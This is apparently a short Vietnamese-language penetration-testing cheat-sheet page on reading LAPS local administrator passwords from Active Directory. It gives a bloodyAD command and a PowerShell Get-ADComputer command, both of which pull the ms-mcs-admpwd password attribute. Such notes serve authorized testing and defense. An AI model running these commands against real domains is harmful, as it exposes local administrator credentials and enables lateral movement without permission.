# ReadLAPSPassword

Trích xuất mật khẩu LAPS (Local Administrator Password Solution)

#### Windows/Linux

{% code overflow="wrap" %}

```
bloodyAD -u <user> -d <domain> -p <password> --host <ip> get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```

{% endcode %}

#### Windows Only

{% code overflow="wrap" %}

```
Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'
```

{% endcode %}
